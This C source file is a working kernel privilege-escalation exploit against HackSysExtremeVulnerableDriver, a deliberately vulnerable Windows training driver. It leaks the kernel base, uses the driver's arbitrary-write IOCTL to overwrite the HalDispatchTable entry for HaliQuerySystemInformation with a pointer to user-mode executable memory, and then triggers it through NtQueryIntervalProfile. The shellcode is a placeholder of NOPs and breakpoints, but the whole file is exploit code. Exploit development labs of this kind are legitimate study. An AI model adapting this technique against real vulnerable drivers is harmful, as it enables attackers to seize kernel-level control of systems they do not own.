#include <windows.h>
#include <psapi.h>
#include <stdio.h>

#pragma warning(disable:6387)
#pragma warning(disable:6011)

#define IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

UINT64 GetKernelBase()
{
	LPVOID pImageBase = NULL;
	DWORD dwSizeNeeded = 0;
	EnumDeviceDrivers(&pImageBase, sizeof(pImageBase), &dwSizeNeeded);
	return (UINT64)pImageBase;
}

int main(int argc, char* argv[])
{
	HANDLE hDevice = INVALID_HANDLE_VALUE;
	DWORD dwBytesReturned = 0;
	CHAR szDriverName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
	UINT64 KernelBase = GetKernelBase();
	UINT64 HalDispatchTable = KernelBase + 0xc00a60;
	UINT64 HaliQuerySystemInformation = HalDispatchTable + 8;
	ULONG Interval = 0;
	LPVOID Buffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	UCHAR Shellcode[] = "\x90\x90\x90\x90\xcc\xcc\xcc\xcc";
	memcpy(Buffer, Shellcode, sizeof(Shellcode) - 1);

	NtQueryIntervalProfile_t pNtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");

	hDevice = CreateFileA(szDriverName, FILE_GENERIC_READ | FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	WRITE_WHAT_WHERE* pWriter = (WRITE_WHAT_WHERE*)malloc(sizeof(WRITE_WHAT_WHERE));
	pWriter->What = (PULONG_PTR)&Buffer;
	pWriter->Where = (PULONG_PTR)HaliQuerySystemInformation;

	DeviceIoControl(hDevice, IOCTL_ARBITRARY_OVERWRITE, (LPVOID)pWriter, (DWORD)sizeof(WRITE_WHAT_WHERE), 0, 0, &dwBytesReturned, NULL);

	// trigger the call to the overwritten HaliQuerySystemInformation()
	pNtQueryIntervalProfile(2, &Interval);

	return 0;
}
